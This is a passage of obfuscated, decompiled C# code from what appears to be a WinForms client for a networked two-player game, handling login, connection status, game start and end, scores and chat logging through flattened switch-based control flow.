            case 19:
              goto label_18;
            case 20:
              this._Code.Enabled = true;
              int num6 = 3;
              num2 = GetterStrategyConnector.StopInfo() ? num6 : num6;
              continue;
            case 21:
              goto label_16;
            default:
              goto label_22;
          }
        }
label_2:
        this._Issuer.Rows.Clear();
label_3:
        this._Producer.Visible = true;
        num1 = 11;
        continue;
label_4:
        this.m_Exception.Rows.Clear();
        this.m_Mapper.Rows.Clear();
        this._Setter.Text = RoleValueFilter.RestartVisitor(2624);
        num1 = 4;
        continue;
label_6:
        this._Manager.Visible = true;
        num1 = 6;
        continue;
label_7:
        this.m_Candidate = new PoolFieldMessage(RoleValueFilter.RestartVisitor(728));
        this.config = GetterStrategyConnector.InfoComparatorConsumer.DECONNECTED;
        num1 = 7;
        continue;
label_9:
        bool flag;
        if (flag)
        {
          num1 = 15;
          continue;
        }
        goto label_3;
label_11:
        this._Connection.Enabled = false;
        num1 = 16;
        continue;
label_12:
        this.advisor.Enabled = false;
        num1 = 14;
        continue;
label_14:
        this.specification.Enabled = false;
        num1 = 9;
        continue;
label_17:
        flag = this.config != GetterStrategyConnector.InfoComparatorConsumer.PLAYING_COMPUTER;
        num1 = 18;
        continue;
label_18:
        this._Utils = 0;
        num1 = 0;
        continue;
label_22:
        num1 = 20;
        continue;
label_23:
        this.order.Enabled = false;
        num1 = 2;
        continue;
label_24:
        this._FieldComparator.Stop();
        num1 = 19;
      }
label_16:
      return;
label_26:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void connectionHandler(PoolFieldMessage config)
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        // ISSUE: variable of a compiler-generated type
        GetterStrategyConnector.ExporterValueFilter exporterValueFilter;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 5:
              // ISSUE: object of a compiler-generated type is created
              exporterValueFilter = new GetterStrategyConnector.ExporterValueFilter();
              num2 = 4;
              continue;
            case 1:
              // ISSUE: reference to a compiler-generated field
              exporterValueFilter.proxyComparator = config;
              goto case 2;
            case 2:
            case 3:
              // ISSUE: reference to a compiler-generated method
              this.Invoke((Delegate) new MethodInvoker(exporterValueFilter.NewVisitor));
              num2 = 6;
              continue;
            case 4:
              // ISSUE: reference to a compiler-generated field
              exporterValueFilter.indexerComparator = this;
              int num3 = 1;
              num2 = GetterStrategyConnector.StopInfo() ? num3 : num3;
              continue;
            case 6:
              goto label_6;
            default:
              goto label_4;
          }
        }
label_4:
        num1 = 2;
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PrintComparator()
    {
      int num1 = 1;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_4;
            case 1:
              this._Producer.Enabled = true;
              num2 = 4;
              continue;
            case 2:
            case 7:
              goto label_11;
            case 3:
              this.config = GetterStrategyConnector.InfoComparatorConsumer.CONNECTED;
              num2 = 5;
              continue;
            case 4:
              this._Manager.Enabled = true;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 7;
                continue;
              }
              goto label_4;
            case 5:
            case 8:
              goto label_9;
            case 6:
              this._Base.Text = "";
              int num3 = 3;
              num2 = GetterStrategyConnector.StopInfo() ? num3 : num3;
              continue;
            case 9:
              this.m_Service.Enabled = true;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 0;
                continue;
              }
              goto case 4;
            case 10:
              goto label_8;
            case 11:
              goto label_13;
            default:
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 10;
                continue;
              }
              goto label_8;
          }
        }
label_4:
        this._Connection.Enabled = true;
label_8:
        this.m_Expression.Enabled = false;
        num1 = 6;
        continue;
label_9:
        this._Getter.Text = this.m_Candidate?.ToString() + RoleValueFilter.RestartVisitor(2634) + this.config.ToString();
        num1 = 11;
        continue;
label_11:
        this.advisor.Enabled = true;
        num1 = 9;
      }
label_13:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void loginHandler(PoolFieldMessage key)
    {
      int num1 = 0;
      while (true)
      {
        // ISSUE: variable of a compiler-generated type
        GetterStrategyConnector.ModelComparator modelComparator;
        int num2;
        switch (num1)
        {
          case 0:
            // ISSUE: object of a compiler-generated type is created
            modelComparator = new GetterStrategyConnector.ModelComparator();
            num2 = 3;
            break;
          case 1:
          case 3:
            // ISSUE: reference to a compiler-generated field
            modelComparator.m_ItemComparator = this;
            num2 = 4;
            break;
          case 2:
          case 4:
            // ISSUE: reference to a compiler-generated field
            modelComparator.m_MerchantComparator = key;
            goto case 5;
          case 5:
            // ISSUE: reference to a compiler-generated method
            this.Invoke((Delegate) new MethodInvoker(modelComparator.OrderVisitor));
            num2 = 6;
            break;
          case 6:
            goto label_8;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
      }
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void WriteComparator()
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 8:
              this.config = GetterStrategyConnector.InfoComparatorConsumer.LOGED;
              if (true)
              {
                num2 = 7;
                continue;
              }
              goto label_15;
            case 1:
            case 4:
              goto label_9;
            case 2:
              goto label_13;
            case 3:
              goto label_1;
            case 5:
              if (flag)
              {
                if (GetterStrategyConnector.NewInfo())
                {
                  num2 = 10;
                  continue;
                }
                goto label_13;
              }
              else
                goto label_10;
            case 6:
              goto label_6;
            case 7:
              goto label_7;
            case 9:
              this._Connection.Enabled = true;
              this._Base.Text = "";
              num2 = 0;
              continue;
            case 10:
              goto label_8;
            case 11:
              goto label_10;
            case 12:
              goto label_17;
            default:
              goto label_4;
          }
        }
label_1:
        this.advisor.Enabled = false;
        goto label_6;
label_4:
        num1 = 6;
        continue;
label_6:
        this.m_Service.Enabled = false;
        num1 = 9;
        continue;
label_7:
        this._Getter.Text = this.m_Candidate?.ToString() + RoleValueFilter.RestartVisitor(2634) + this.config.ToString();
        num1 = 12;
        continue;
label_8:
        this._Issuer.Rows[0].Cells[0].Value = (object) this.m_Candidate.StartRecord();
        num1 = 11;
        continue;
label_9:
        this._Manager.Enabled = true;
        num1 = 3;
        continue;
label_10:
        this._Producer.Enabled = true;
        num1 = 1;
        continue;
label_13:
        flag = this._Issuer.Rows.Count > 0;
        num1 = 5;
      }
label_17:
      return;
label_15:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InterruptComparator()
    {
      int num1 = 6;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 6:
            this._Producer.Enabled = false;
            num1 = 4;
            continue;
          case 1:
            this._Connection.Enabled = false;
            goto case 5;
          case 2:
            this.config = GetterStrategyConnector.InfoComparatorConsumer.WAITING;
            if (true)
            {
              num1 = 3;
              continue;
            }
            goto case 3;
          case 3:
            this._Getter.Text = this.m_Candidate?.ToString() + RoleValueFilter.RestartVisitor(2634) + this.config.ToString();
            num2 = 10;
            break;
          case 4:
            this._Manager.Enabled = false;
            num2 = 8;
            break;
          case 5:
          case 7:
            this.specification.Enabled = false;
            num2 = 2;
            break;
          case 8:
            this.advisor.Enabled = false;
            if (GetterStrategyConnector.NewInfo())
            {
              num1 = 9;
              continue;
            }
            goto case 4;
          case 9:
            this.m_Service.Enabled = false;
            num2 = 1;
            break;
          case 10:
            goto label_12;
          default:
            num2 = 7;
            break;
        }
        num1 = num2;
      }
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void userListHandler(List<PoolFieldMessage> key) => this.Invoke((Delegate) new MethodInvoker(new GetterStrategyConnector.ClientVisitorConfig()
    {
      interceptorComparator = this,
      m_IdentifierComparator = key
    }.ViewVisitor));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void clearHandler() => this.Invoke((Delegate) (() =>
    {
      this._Setter.Text = RoleValueFilter.RestartVisitor(2624);
      this.m_Mapper.Rows.Clear();
    }));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void requestHandler(PoolFieldMessage reference)
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        // ISSUE: variable of a compiler-generated type
        GetterStrategyConnector.CallbackComparator callbackComparator;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_8;
            case 1:
            case 3:
              goto label_1;
            case 4:
              // ISSUE: reference to a compiler-generated field
              callbackComparator.statusComparator = this;
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto label_8;
            case 5:
              goto label_2;
            case 6:
              goto label_6;
            default:
              int num3 = 1;
              num2 = GetterStrategyConnector.StopInfo() ? num3 : num3;
              continue;
          }
        }
label_1:
        // ISSUE: reference to a compiler-generated method
        this.Invoke((Delegate) new MethodInvoker(callbackComparator.AddVisitor));
        num1 = 6;
        continue;
label_2:
        // ISSUE: reference to a compiler-generated field
        callbackComparator.stateComparator = reference;
        goto label_1;
label_8:
        // ISSUE: object of a compiler-generated type is created
        callbackComparator = new GetterStrategyConnector.CallbackComparator();
        num1 = 4;
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void abortHandler(PoolFieldMessage var1, bool containsord)
    {
      int num1 = 2;
      if (true)
        goto label_7;
label_1:
      // ISSUE: variable of a compiler-generated type
      GetterStrategyConnector.TokenComparator tokenComparator;
      // ISSUE: reference to a compiler-generated method
      this.Invoke((Delegate) new MethodInvoker(tokenComparator.CompareVisitor));
      num1 = 7;
label_7:
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 2:
            // ISSUE: object of a compiler-generated type is created
            tokenComparator = new GetterStrategyConnector.TokenComparator();
            if (GetterStrategyConnector.NewInfo())
            {
              num1 = 3;
              continue;
            }
            goto case 1;
          case 1:
          case 3:
            // ISSUE: reference to a compiler-generated field
            tokenComparator.m_ReaderComparator = containsord;
            num2 = 4;
            break;
          case 4:
            // ISSUE: reference to a compiler-generated field
            tokenComparator.m_MockComparator = this;
            goto case 6;
          case 5:
            goto label_1;
          case 6:
            // ISSUE: reference to a compiler-generated field
            tokenComparator.facadeComparator = var1;
            num2 = 5;
            break;
          case 7:
            goto label_10;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
      }
label_10:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void startGameHandler(PoolFieldMessage key, bool isattr)
    {
      int num = 1;
      // ISSUE: variable of a compiler-generated type
      GetterStrategyConnector.TagComparator tagComparator;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            // ISSUE: object of a compiler-generated type is created
            tagComparator = new GetterStrategyConnector.TagComparator();
            if (true)
            {
              num = 6;
              continue;
            }
            goto label_8;
          case 2:
            // ISSUE: reference to a compiler-generated field
            tagComparator.m_EventComparator = key;
            goto case 3;
          case 3:
            // ISSUE: reference to a compiler-generated field
            tagComparator.databaseComparator = isattr;
            if (GetterStrategyConnector.NewInfo())
            {
              num = 5;
              continue;
            }
            goto case 6;
          case 4:
          case 5:
            // ISSUE: reference to a compiler-generated method
            this.Invoke((Delegate) new MethodInvoker(tagComparator.ResolveVisitor));
            num = 7;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            tagComparator.m_ErrorComparator = this;
            if (true)
            {
              num = 2;
              continue;
            }
            goto case 2;
          case 7:
            goto label_10;
          default:
            if (true)
            {
              num = 3;
              continue;
            }
            goto case 0;
        }
      }
label_10:
      return;
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void gameHandler(object key)
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        // ISSUE: variable of a compiler-generated type
        GetterStrategyConnector.InterceptorAuthenticationWatcher authenticationWatcher;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              // ISSUE: reference to a compiler-generated field
              authenticationWatcher._ProccesorComparator = this;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 5;
                continue;
              }
              goto case 3;
            case 2:
              // ISSUE: object of a compiler-generated type is created
              authenticationWatcher = new GetterStrategyConnector.InterceptorAuthenticationWatcher();
              if (true)
              {
                num2 = 0;
                continue;
              }
              goto label_8;
            case 3:
            case 4:
              // ISSUE: reference to a compiler-generated method
              this.Invoke((Delegate) new MethodInvoker(authenticationWatcher.AssetVisitor));
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto case 5;
            case 5:
              // ISSUE: reference to a compiler-generated field
              authenticationWatcher._StructComparator = key;
              goto case 3;
            case 6:
              goto label_10;
            default:
              goto label_6;
          }
        }
label_6:
        num1 = 4;
      }
label_10:
      return;
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PushComparator()
    {
      int num = 2;
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            flag = this.m_Request != null;
            num = 5;
            continue;
          case 1:
          case 5:
            if (flag)
            {
              num = 3;
              continue;
            }
            goto label_9;
          case 3:
            this.DestroyComparator(this.m_Request.poolComparator, this.m_Request._DecoratorComparator, this.m_Request.m_SerializerComparator, this.m_Request.m_ClassComparator);
            goto case 4;
          case 4:
            this.m_Request = (GetterStrategyConnector.ObserverAnnotationState) null;
            num = 6;
            continue;
          case 6:
            goto label_8;
          default:
            num = 4;
            continue;
        }
      }
label_9:
      return;
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void FillComparator(int last_start)
    {
      int num1 = 7;
      while (true)
      {
        int num2;
        bool helper;
        switch (num1)
        {
          case 0:
            this.ValidateResolver();
            num2 = 4;
            break;
          case 1:
          case 9:
            helper = this.helper;
            if (true)
            {
              num1 = 2;
              continue;
            }
            goto case 2;
          case 2:
            if (helper)
            {
              num2 = 0;
              break;
            }
            this.PushComparator();
            num2 = 8;
            break;
          case 3:
            this._FieldComparator.Start();
            num2 = 5;
            break;
          case 4:
            this._Broadcaster.Enabled = false;
            goto case 3;
          case 5:
            goto label_14;
          case 6:
            goto label_15;
          case 7:
            this.IncludeComparator(last_start == 1);
            num1 = 9;
            continue;
          case 8:
            this.draw();
            num2 = 10;
            break;
          case 10:
            goto label_13;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
      }
label_14:
      return;
label_15:
      return;
label_13:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected void SortComparator(object spec, int previous_attr)
    {
      int num1 = 7;
      if (GetterStrategyConnector.NewInfo())
        goto label_6;
label_1:
      SqlParameterType state = this.updateMove();
      int num2 = 0;
label_5:
      num1 = num2;
label_6:
      bool flag;
      while (true)
      {
        switch (num1)
        {
          case 0:
            flag = state != (SqlParameterType) 3;
            if (GetterStrategyConnector.NewInfo())
            {
              num1 = 1;
              continue;
            }
            goto label_9;
          case 1:
          case 3:
            if (!flag)
              goto label_11;
            else
              goto case 4;
          case 2:
            this.FillComparator(0);
            int num3 = 9;
            num1 = GetterStrategyConnector.StopInfo() ? num3 : num3;
            continue;
          case 4:
          case 5:
            // ISSUE: reference to a compiler-generated field
            this._Method(spec, state);
            int num4 = 8;
            num1 = GetterStrategyConnector.StopInfo() ? num4 : num4;
            continue;
          case 6:
            goto label_1;
          case 7:
            this.setLastMove(spec, previous_attr);
            if (true)
            {
              num1 = 6;
              continue;
            }
            goto case 2;
          case 8:
            goto label_10;
          case 9:
            goto label_13;
          default:
            goto label_7;
        }
      }
label_10:
      return;
label_7:
      num2 = 5;
      goto label_5;
label_9:
      return;
label_11:
      // ISSUE: reference to a compiler-generated field
      this._Page(spec);
      num2 = 2;
      goto label_5;
label_13:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void stopGameHandler(PoolFieldMessage init)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        // ISSUE: variable of a compiler-generated type
        GetterStrategyConnector.DispatcherValueFilter dispatcherValueFilter;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_7;
            case 1:
            case 5:
              // ISSUE: reference to a compiler-generated field
              dispatcherValueFilter._ValComparator = this;
              num2 = 2;
              continue;
            case 2:
              goto label_1;
            case 3:
            case 4:
              goto label_6;
            case 6:
              goto label_8;
            default:
              goto label_4;
          }
        }
label_1:
        // ISSUE: reference to a compiler-generated field
        dispatcherValueFilter.singletonComparator = init;
        goto label_6;
label_4:
        num1 = 4;
        continue;
label_6:
        // ISSUE: reference to a compiler-generated method
        this.Invoke((Delegate) new MethodInvoker(dispatcherValueFilter.VisitVisitor));
        num1 = 6;
        continue;
label_7:
        // ISSUE: object of a compiler-generated type is created
        dispatcherValueFilter = new GetterStrategyConnector.DispatcherValueFilter();
        num1 = 5;
      }
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected virtual void ValidateResolver()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CallComparator()
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
              flag = this.m_Repository != GetterStrategyConnector.InfoComparatorConsumer.LOGED;
              goto case 7;
            case 1:
              this._Broadcaster.Visible = false;
              this._Issuer.Rows.Clear();
              num2 = 8;
              continue;
            case 2:
              goto label_5;
            case 3:
              this.order.Enabled = false;
              num2 = 2;
              continue;
            case 4:
              this.config = this.m_Repository;
              if (true)
              {
                num2 = 9;
                continue;
              }
              goto label_18;
            case 5:
              this.advisor.Enabled = true;
              this.m_Service.Enabled = true;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 11;
                continue;
              }
              goto label_3;
            case 7:
            case 12:
              if (flag)
              {
                if (GetterStrategyConnector.NewInfo())
                {
                  num2 = 5;
                  continue;
                }
                goto case 0;
              }
              else
                goto case 11;
            case 8:
              goto label_3;
            case 9:
              goto label_4;
            case 10:
              this.stubComparator.Visible = false;
              if (true)
              {
                num2 = 1;
                continue;
              }
              goto case 7;
            case 11:
              this.reset();
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto case 3;
            case 13:
              this._Manager.Visible = true;
              int num3 = 10;
              num2 = GetterStrategyConnector.StopInfo() ? num3 : num3;
              continue;
            case 14:
              goto label_14;
            default:
              goto label_12;
          }
        }
label_3:
        this._Code.Enabled = true;
        num1 = 0;
        continue;
label_4:
        this._Getter.Text = this.m_Candidate?.ToString() + RoleValueFilter.RestartVisitor(2634) + this.config.ToString();
        num1 = 14;
        continue;
label_5:
        this._Producer.Visible = true;
        num1 = 13;
        continue;
label_12:
        num1 = 12;
      }
label_14:
      return;
label_18:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void endGameHandler(
      PoolFieldMessage def,
      PoolFieldMessage reg,
      SqlParameterType tag,
      bool explicitvar12,
      object param3)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        // ISSUE: variable of a compiler-generated type
        GetterStrategyConnector.RuleComparator ruleComparator;
        while (true)
        {
          switch (num2)
          {
            case 0:
              // ISSUE: object of a compiler-generated type is created
              ruleComparator = new GetterStrategyConnector.RuleComparator();
              num2 = 7;
              continue;
            case 1:
            case 7:
              // ISSUE: reference to a compiler-generated field
              ruleComparator.interpreterComparator = this;
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto case 2;
            case 2:
              // ISSUE: reference to a compiler-generated field
              ruleComparator.definitionComparator = reg;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 8;
                continue;
              }
              goto case 9;
            case 3:
              goto label_5;
            case 4:
            case 8:
              goto label_1;
            case 5:
              goto label_7;
            case 6:
              goto label_6;
            case 9:
              // ISSUE: reference to a compiler-generated method
              this.Invoke((Delegate) new MethodInvoker(ruleComparator.ListVisitor));
              num2 = 10;
              continue;
            case 10:
              goto label_12;
            default:
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto label_5;
          }
        }
label_1:
        // ISSUE: reference to a compiler-generated field
        ruleComparator.descriptorComparator = tag;
label_5:
        // ISSUE: reference to a compiler-generated field
        ruleComparator._ParserComparator = explicitvar12;
        num1 = 6;
        continue;
label_6:
        // ISSUE: reference to a compiler-generated field
        ruleComparator._MappingComparator = param3;
        num1 = 9;
        continue;
label_7:
        // ISSUE: reference to a compiler-generated field
        ruleComparator.m_ThreadComparator = def;
        num1 = 2;
      }
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void DestroyComparator(
      PoolFieldMessage param,
      PoolFieldMessage pol,
      SqlParameterType res,
      bool injectfirst2)
    {
      int num1 = 17;
      while (true)
      {
        bool flag1;
        int num2;
        bool flag2;
        int num3;
        bool flag3;
        switch (num1)
        {
          case 0:
            DataGridViewCell cell1 = this._Issuer.Rows[1].Cells[1];
            num3 = pol.Points;
            string str1 = num3.ToString();
            cell1.Value = (object) str1;
            num2 = 1;
            goto label_9;
          case 1:
            DataGridViewCell cell2 = this._Issuer.Rows[1].Cells[2];
            num3 = pol.CloneRecord();
            string str2 = num3.ToString();
            cell2.Value = (object) str2;
            num2 = 14;
            goto label_9;
          case 2:
          case 3:
            if (flag3)
            {
              num2 = 13;
              goto label_9;
            }
            else
              break;
          case 4:
            this.InitComparator(new PoolFieldMessage(RoleValueFilter.RestartVisitor(2690)), RoleValueFilter.RestartVisitor(2846) + pol.StartRecord() + RoleValueFilter.RestartVisitor(2882));
            num2 = 18;
            goto label_9;
          case 5:
            goto label_3;
          case 6:
            if (flag1)
            {
              this.log((BehaviorAccumulateValues) 0, RoleValueFilter.RestartVisitor(2792));
              num2 = 16;
              goto label_9;
            }
            else
            {
              this.log((BehaviorAccumulateValues) 0, RoleValueFilter.RestartVisitor(2932));
              num2 = 4;
              goto label_9;
            }
          case 7:
            this.IncludeComparator(injectfirst2);
            break;
          case 8:
            this.log((BehaviorAccumulateValues) 0, RoleValueFilter.RestartVisitor(2664));
            this.InitComparator(new PoolFieldMessage(RoleValueFilter.RestartVisitor(2690)), RoleValueFilter.RestartVisitor(2716));
            num2 = 5;
            goto label_9;
          case 9:
            goto label_26;
          case 10:
            this.reset();
            num2 = 7;
            goto label_9;
          case 11:
            goto label_27;
          case 12:
label_18:
            if (!flag2)
            {
              flag1 = res == (SqlParameterType) 0;
              num2 = 6;
              goto label_9;
            }
            else
            {
              num1 = 8;
              continue;
            }
          case 13:
            DataGridViewCell cell3 = this._Issuer.Rows[0].Cells[1];
            num3 = this.m_Candidate.Points;
            string str3 = num3.ToString();
            cell3.Value = (object) str3;
            DataGridViewCell cell4 = this._Issuer.Rows[0].Cells[2];
            num3 = this.m_Candidate.CloneRecord();
            string str4 = num3.ToString();
            cell4.Value = (object) str4;
            num2 = 0;
            goto label_9;
          case 14:
            this._Getter.Text = this.m_Candidate?.ToString() + RoleValueFilter.RestartVisitor(2634) + this.config.ToString() + RoleValueFilter.RestartVisitor(2644) + pol.StartRecord() + RoleValueFilter.RestartVisitor(2658);
            num2 = 10;
            goto label_9;
          case 15:
            flag3 = this._Issuer.Rows.Count > 1;
            num2 = 3;
            goto label_9;
          case 16:
            this.InitComparator(new PoolFieldMessage(RoleValueFilter.RestartVisitor(2690)), RoleValueFilter.RestartVisitor(2846) + this.m_Candidate.StartRecord() + RoleValueFilter.RestartVisitor(2882));
            num2 = 9;
            goto label_9;
          case 17:
            this.m_Candidate = param;
            num2 = 15;
            goto label_9;
          case 18:
            goto label_25;
          default:
            num2 = 12;
            goto label_9;
        }
        flag2 = res == (SqlParameterType) 2;
        goto label_18;
label_9:
        num1 = num2;
      }
label_3:
      return;
label_26:
      return;
label_27:
      return;
label_25:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void IncludeComparator(bool isfirst)
    {
      int num1 = 4;
      if (true)
        goto label_3;
label_1:
      this.m_Predicate.Enabled = true;
      return;
label_3:
      while (true)
      {
        int num2;
        bool flag;
        switch (num1)
        {
          case 0:
            if (!flag)
            {
              this._Issuer.Rows[1].Selected = true;
              num2 = 7;
              break;
            }
            num2 = 3;
            break;
          case 1:
            goto label_1;
          case 2:
          case 3:
            this._Issuer.Rows[0].Selected = true;
            num2 = 1;
            break;
          case 4:
            flag = isfirst;
            num2 = 0;
            break;
          case 5:
          case 7:
            this.m_Predicate.Enabled = false;
            num2 = 8;
            break;
          case 6:
            goto label_12;
          case 8:
            goto label_11;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
      }
label_12:
      return;
label_11:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void receiveMsgHandler(PoolFieldMessage var1, string ord)
    {
      int num1 = 6;
      while (true)
      {
        int num2 = num1;
        // ISSUE: variable of a compiler-generated type
        GetterStrategyConnector.TemplateComparator templateComparator;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
              goto label_4;
            case 1:
            case 2:
              goto label_3;
            case 3:
              goto label_5;
            case 4:
              goto label_2;
            case 5:
              // ISSUE: reference to a compiler-generated method
              this.Invoke((Delegate) new MethodInvoker(templateComparator.CalcVisitor));
              if (true)
              {
                num2 = 7;
                continue;
              }
              goto label_2;
            case 7:
              goto label_9;
            default:
              goto label_8;
          }
        }
label_2:
        // ISSUE: reference to a compiler-generated field
        templateComparator.bridgeComparator = ord;
        num1 = 5;
        continue;
label_3:
        // ISSUE: reference to a compiler-generated field
        templateComparator.algoComparator = this;
        num1 = 3;
        continue;
label_4:
        // ISSUE: object of a compiler-generated type is created
        templateComparator = new GetterStrategyConnector.TemplateComparator();
        num1 = 2;
        continue;
label_5:
        // ISSUE: reference to a compiler-generated field
        templateComparator.m_AttrComparator = var1;
        goto label_2;
label_8:
        num1 = 4;
      }
label_9:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InitComparator(PoolFieldMessage param, string map)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_11;
            case 1:
              goto label_1;
            case 2:
            case 6:
              goto label_2;
            case 3:
              goto label_13;
            case 4:
            case 5:
              this.regComparator.SelectionColor = this.regComparator.ForeColor;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 7;
                continue;
              }
              goto label_11;
            case 7:
              goto label_4;
            default:
              if (true)
              {
                num2 = 1;
                continue;
              }
              goto case 4;
          }
        }
label_1:
        this.regComparator.AppendText(param.StartRecord() + RoleValueFilter.RestartVisitor(2980) + DateTime.Now.ToString(RoleValueFilter.RestartVisitor(2988)) + RoleValueFilter.RestartVisitor(322) + map + RoleValueFilter.RestartVisitor(2070));
        num1 = 5;
        continue;
label_2:
        Color color = Color.Green;
label_6:
        this.regComparator.SelectionColor = color;
        goto label_1;
label_11:
        if (param.Equals((object) new PoolFieldMessage(RoleValueFilter.RestartVisitor(2690))))
        {
          color = Color.DarkRed;
          goto label_6;
        }
        else
        {
          num1 = 6;
          continue;
        }
label_13:
        if (param.Equals((object) this.m_Candidate))
        {
          color = Color.Blue;
          goto label_6;
        }
        else
          num1 = 0;
      }
label_4:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void showView(PoolFieldMessage init)
    {
      int num1 = 7;
      if (true)
        goto label_9;
label_1:
      bool flag;
      int num2;
      if (flag)
      {
        num2 = 3;
        goto label_8;
      }
label_4:
      int num3 = (int) this.ShowDialog();
      num1 = 8;
      goto label_9;
label_8:
      num1 = num2;
label_9:
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_1;
          case 1:
          case 5:
            goto label_3;
          case 2:
          case 4:
            this.m_Service.Visible = false;
            if (true)
            {
              num1 = 1;
              continue;
            }
            goto case 6;
          case 3:
            goto label_5;
          case 6:
            this._Printer.Text = init.VerifyRecord();
            goto case 2;
          case 7:
            goto label_11;
          case 8:
            goto label_12;
          default:
            goto label_10;
        }
      }
label_3:
      goto label_4;
label_5:
      this._Listener.Text = init.StartRecord();
      num2 = 6;
      goto label_8;
label_12:
      return;
label_10:
      num2 = 2;
      goto label_8;
label_11:
      flag = init != null;
      num2 = 0;
      goto label_8;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void showRegisterOption() => this.Invoke((Delegate) (() => this.m_Service.Visible = true));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool isOpened() => this.Visible;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void printCSMessage(
      KeyValuePair<BehaviorAccumulateValues, string> setup)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: reference to a compiler-generated method
      this.Invoke((Delegate) new MethodInvoker(new GetterStrategyConnector.OrderPublisherSpec()
      {
        propertyComparator = setup,
        _ObserverComparator = this
      }.GetVisitor));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void log(BehaviorAccumulateValues asset, string ivk) => this.printCSMessage(new KeyValuePair<BehaviorAccumulateValues, string>(asset, ivk));

    public event SchemaPublisherService connectionEvent
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 3;
        object obj;
        while (true)
        {
          int num2;
          switch (num1)
          {
            case 0:
            case 3:
              obj = this._Params;
              num2 = 2;
              break;
            case 1:
            case 2:
              goto label_1;
            case 4:
              goto label_6;
            default:
              num2 = 4;
              break;
          }
          num1 = num2;
        }
label_1:
        bool lockTaken = false;
label_6:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num3 = 2;
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 2:
                goto label_7;
              case 1:
                goto label_13;
              case 3:
                goto label_14;
              default:
                num3 = 3;
                continue;
            }
          }
label_7:
          this.StartComparator(value);
          return;
label_13:
          return;
label_14:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 3;
        if (true)
          goto label_3;
label_1:
        bool lockTaken = false;
        goto label_6;
label_3:
        object obj;
        while (true)
        {
          int num2;
          switch (num1)
          {
            case 0:
            case 3:
              obj = this._Params;
              num2 = 2;
              break;
            case 1:
            case 2:
              goto label_1;
            case 4:
              goto label_6;
            default:
              num2 = 4;
              break;
          }
          num1 = num2;
        }
label_6:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
